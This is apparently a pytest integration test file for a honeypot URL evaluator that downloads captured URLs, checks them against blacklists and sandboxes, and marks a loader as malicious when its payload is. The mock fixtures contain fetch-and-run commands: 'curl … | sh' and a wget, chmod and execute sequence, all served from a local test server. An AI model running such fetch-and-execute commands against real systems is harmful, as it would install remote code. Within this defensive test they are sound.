"""IDEA event from Warden -> URLs in DB -> evaluator downloads them -> classification + back-propagation."""

import hashlib
import json
import re
from datetime import timedelta

import pytest
import responses
from freezegun import freeze_time

from tests.api_mocks import load_json
from tests.factories import insert_url

pytestmark = pytest.mark.integration


def idea_event(session):
    event = load_json("idea", "cowrie_session.json")
    event["Attach"] = [{"Type": ["ShellCode"], "Content": session}]
    return event


def classification(db, url):
    return db.execute("SELECT classification, classification_reason, evaluated FROM urls WHERE url = ?", (url,)).fetchone()


def test_malicious_payload_marks_its_loader_malicious(
        warden2evaluator_mod, evaluator_mod, httpserver, external_apis, run_evaluator, db):
    loader = httpserver.url_for("/loader.sh")
    payload = httpserver.url_for("/bins/x86")
    httpserver.expect_request("/loader.sh").respond_with_data(
        f"#!/bin/sh\ncd /tmp\nwget {payload} -O x86\nchmod +x x86; ./x86\n", content_type="text/x-shellscript")
    httpserver.expect_request("/bins/x86").respond_with_data(
        b"\x7fELF\x02\x01\x01" + b"\x00" * 120, content_type="application/octet-stream")
    external_apis(blacklist=[payload])  # only the payload is known to URLhaus

    # 1. Honeypot session arrives from Warden
    assert warden2evaluator_mod.handle_events([idea_event(f"curl -s {loader} | sh")]) == [loader]

    # 2. Evaluator downloads the loader, finds the payload URL in it and evaluates both
    assert run_evaluator(evaluator_mod) == [loader, payload]

    assert classification(db, payload) == ("malicious", "Blacklist check", "yes")
    # back-propagation: the loader downloaded a malicious payload
    assert classification(db, loader) == ("malicious", "Downloading from malicious URL", "yes")
    assert db.execute("SELECT url, src_url FROM discovered_urls").fetchall() == [(payload, loader)]
    history = db.execute("SELECT url, classification, actor FROM classification_history ORDER BY id").fetchall()
    assert history == [
        (loader, "unclassified", "evaluator"),
        (payload, "malicious", "evaluator"),
        (loader, "malicious", "evaluator-backprop"),
    ]
    # both downloads were stored with their fetch metadata
    rows = db.execute("SELECT url, source_ip, status_code, change_type FROM download_observations ORDER BY id").fetchall()
    assert rows == [(loader, "127.0.0.1", 200, "initial"), (payload, "127.0.0.1", 200, "initial")]


def test_vt_quota_postpones_url_until_reset(evaluator_mod, httpserver, http_mock, external_apis, run_evaluator, db):
    url = insert_url(db, httpserver.url_for("/a.sh"))
    httpserver.expect_request("/a.sh").respond_with_data("echo hi\n", content_type="text/plain")
    apis = external_apis(vt_url="quota_exceeded.json")

    with freeze_time("2026-01-01 23:00:00") as clock:
        assert run_evaluator(evaluator_mod) == [url]

        assert db.execute("SELECT evaluated, eval_later FROM urls").fetchone() == ("no", "yes")
        assert db.execute("SELECT COUNT(*) FROM classification_history").fetchone()[0] == 0  # no decision yet
        assert evaluator_mod.next_url() is None  # skipped while the daily quota is exceeded

        # The daily quota is reset at midnight (UTC): the postponed URL is evaluated again,
        # even when no new URL arrives in the meantime
        clock.tick(timedelta(hours=2))
        http_mock.replace(responses.GET, apis["vt_url"].url, json=load_json("vt", "not_found.json"), status=404)
        assert run_evaluator(evaluator_mod) == [url]

    assert classification(db, url) == ("unclassified", "No entry", "yes")


def test_unclassified_payload_is_classified_by_its_hybrid_analysis_report(
        evaluator_mod, httpserver, http_mock, config, external_apis, run_evaluator, db):
    loader = insert_url(db, httpserver.url_for("/loader.sh"))
    payload = httpserver.url_for("/bins/x86")
    elf = b"\x7fELF\x02\x01\x01" + b"\x00" * 120
    httpserver.expect_request("/loader.sh").respond_with_data(
        f"#!/bin/sh\nwget {payload} -O x86; ./x86\n", content_type="text/x-shellscript")
    httpserver.expect_request("/bins/x86").respond_with_data(elf, content_type="application/octet-stream")
    apis = external_apis()  # nobody knows the samples, HA answers 404 -> both are submitted

    with freeze_time("2026-01-01 12:00:00") as clock:
        assert run_evaluator(evaluator_mod) == [loader, payload]
        assert classification(db, payload) == ("unclassified", "No entry", "yes")
        assert apis["ha_submit"].call_count == 2  # the loader script and the ELF payload

        # 10 minutes later the scheduled fetch finds the report of the payload only
        report = load_json("ha", "overview_200.json")
        overview = re.compile(f"{config.ha_url}/overview/.+")  # same pattern as mock_external_apis()
        assert http_mock.remove(responses.GET, overview)
        http_mock.add_callback(responses.GET, overview, content_type="application/json", callback=lambda request: (
            (200, {}, json.dumps(report)) if request.url.endswith(hashlib.sha256(elf).hexdigest())
            else (404, {}, json.dumps(load_json("ha", "not_found.json")))))
        clock.move_to("2026-01-01 12:10:05")
        evaluator_mod.fetch_job.run()

    assert classification(db, payload) == ("malicious", "Hybrid Analysis check", "yes")
    # back-propagation: the loader downloaded the malicious payload
    assert classification(db, loader) == ("malicious", "Downloading from malicious URL", "yes")
    assert db.execute("SELECT url, actor FROM classification_history WHERE actor LIKE 'hybrid%' ORDER BY id").fetchall() == [
        (payload, "hybrid-analysis"), (loader, "hybrid-analysis-backprop")]
    # the loader's own submission still waits for its report (next scheduled fetch at 12:20)
    assert db.execute("SELECT status, next_fetch_at FROM sandbox_submissions ORDER BY id").fetchall() == [
        ("pending", "2026-01-01T12:20:00+00:00"), ("done", None)]
